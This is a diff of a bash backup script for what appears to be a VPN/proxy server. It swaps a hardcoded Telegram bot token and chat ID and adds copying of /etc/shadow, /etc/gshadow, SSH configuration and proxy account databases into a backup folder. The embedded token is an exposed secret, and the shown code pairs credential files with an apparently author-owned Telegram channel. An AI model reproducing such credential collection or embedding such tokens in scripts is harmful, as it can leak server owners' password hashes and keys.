@@ -7,7 +7,7 @@ if [[ -r "$THEME_FILE" ]]; then
   . "$THEME_FILE"
 fi
 
-# My Telegram : https://t.me/sampiiiiu
+# My Telegram : https://t.me/sampiiiiuu
 # ==========================================
 # Color
 RED='\033[0;31m'
@@ -19,8 +19,8 @@ PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 LIGHT='\033[0;37m'
 # ==========================================
-export CHATID="5808979739"
-export KEY="6698036607:AAE0eY2RFdv7ECCuBj_S-anbO_gOGLypNGs"
+export CHATID="6617783693"
+export KEY="6751589620:AAHwjP6dzZhuqeyUOdYFc6742Q1YUVF1EjM"
 export TIME="10"
 export URL="https://api.telegram.org/bot$KEY/sendMessage"
 clear
@@ -49,11 +49,19 @@ cp /etc/group "$BACKUP_DIR"/
 cp /etc/shadow "$BACKUP_DIR"/
 cp /etc/gshadow "$BACKUP_DIR"/
 cp /etc/crontab "$BACKUP_DIR"/
-cp /etc/vmess/.vmess.db "$BACKUP_DIR"/
-cp /etc/ssh/.ssh.db "$BACKUP_DIR"/
-cp /etc/vless/.vless.db "$BACKUP_DIR"/
-cp /etc/trojan/.trojan.db "$BACKUP_DIR"/
-cp /etc/shadowsocks/.shadowsocks.db "$BACKUP_DIR"/
+cp -r /etc/vmess/ "$BACKUP_DIR"/
+cp -r /etc/ssh/ "$BACKUP_DIR"/
+cp -r /etc/vless/ "$BACKUP_DIR"/
+cp -r /etc/trojan/ "$BACKUP_DIR"/
+cp -r /etc/limit/vmess/ "$BACKUP_DIR"/vmessquota
+cp -r /etc/limit/vless/ "$BACKUP_DIR"/vlessquota
+cp -r /etc/limit/trojan/ "$BACKUP_DIR"/trojanquota
+cp -r /etc/limit/shadowsocks/ "$BACKUP_DIR"/shadowsocksquota
+cp -r /etc/kyt/limit/vmess/ip/ "$BACKUP_DIR"/vmessip
+cp -r /etc/kyt/limit/vless/ip/ "$BACKUP_DIR"/vlessip
+cp -r /etc/kyt/limit/trojan/ip/ "$BACKUP_DIR"/trojanip
+cp -r /etc/kyt/limit/shadowsocks/ip/ "$BACKUP_DIR"/shadowsocksip
+cp -r /etc/shadowsocks/ "$BACKUP_DIR"/
 cp -r /var/lib/kyt/ "$BACKUP_DIR"/kyt
 cp -r /etc/xray "$BACKUP_DIR"/xray
 cp -r /var/www/html/ "$BACKUP_DIR"/html
